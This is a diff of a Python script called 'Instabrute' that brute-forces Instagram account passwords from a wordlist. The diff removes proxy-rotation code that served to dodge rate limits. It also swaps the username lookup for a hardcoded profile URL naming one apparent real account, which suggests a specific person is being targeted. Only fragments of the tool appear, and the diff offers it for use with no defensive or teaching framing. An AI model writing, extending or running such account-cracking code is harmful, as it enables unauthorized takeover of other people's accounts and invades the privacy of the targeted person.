@@ -7,7 +7,6 @@ import socket
 import socks
 
 import asyncio
-from proxybroker import Broker
 
 import time
 import sys
@@ -63,15 +62,6 @@ async def proxything(proxies):
 			continue
 
 proxies = asyncio.Queue()
-asyncio.get_event_loop().run_until_complete(asyncio.gather(Broker(proxies).find(types=['HTTPS', 'HTTP'], limit=20), proxything(proxies)))
-#find proxy
-def setProxy():
-	for proxy in proxies_list:
-		print('[*] Proxy: %s' % proxy)
-		proxies_list.remove(proxy)
-		return True
-
-
 
 #main class - Instagram bruteforce
 class Instabrute():
@@ -85,7 +75,7 @@ class Instabrute():
 		self.attempts = 0 
 
 	def userExists(self):
-		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
+		r = requests.get('https://www.instagram.com/nidanaseer2/') 
 		if r.status_code == 404:
 			return False
 		elif r.status_code == 200:
@@ -159,7 +149,6 @@ class Instabrute():
 			else:
 				print (r.text)
 
-setProxy()
 #main action
 with codecs.open(args.passwords_file, 'r', 'utf-8') as file:
 	passwords = file.read().splitlines()
